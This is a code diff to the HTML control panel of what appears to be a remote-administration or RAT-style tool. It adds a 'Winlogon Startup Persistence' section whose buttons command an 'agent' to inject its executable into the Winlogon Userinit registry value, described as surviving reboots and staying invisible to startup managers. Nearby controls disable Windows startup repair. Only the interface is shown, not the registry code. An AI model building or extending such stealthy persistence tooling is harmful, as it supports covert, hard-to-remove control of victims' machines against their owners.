@@ -588,6 +588,15 @@ select{background:#050810;border:1px solid var(--border);padding:4px 8px;color:v
               <div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('startuprepair_disable')">DISABLE</button><button class="btn btn-green btn-sm" onclick="adminCmd('startuprepair_enable')">ENABLE</button></div>
             </div>
           </div>
+          <div style="margin:14px 0 8px;font-size:9px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;border-bottom:1px solid var(--border);padding-bottom:4px;">Winlogon Startup Persistence</div>
+          <div style="background:var(--panel2);border:1px solid var(--border);padding:12px 14px;margin-bottom:4px;">
+            <div style="font-size:11px;color:var(--text);margin-bottom:6px;">Injects the agent's executable path into <span style="color:var(--accent2)">HKLM\…\Winlogon → Userinit</span>, which runs on every user login — survives reboots and is invisible to standard startup managers.</div>
+            <div style="display:flex;gap:6px;align-items:center;flex-wrap:wrap;">
+              <button class="btn btn-red btn-sm" onclick="adminCmd('winlogon_add')">⚡ INJECT WINLOGON</button>
+              <button class="btn btn-green btn-sm" onclick="adminCmd('winlogon_remove')">✕ REMOVE WINLOGON</button>
+              <button class="btn btn-blue btn-sm" onclick="adminCmd('winlogon_check')">? CHECK STATUS</button>
+            </div>
+          </div>
           <div style="margin:14px 0 8px;font-size:9px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;border-bottom:1px solid var(--border);padding-bottom:4px;">Result Log</div>
           <div id="admin-result" style="font-size:12px;color:var(--dim);background:#050810;border:1px solid var(--border);padding:10px 14px;min-height:60px;max-height:160px;overflow-y:auto;white-space:pre-wrap;line-height:1.8;"></div>
         </div>
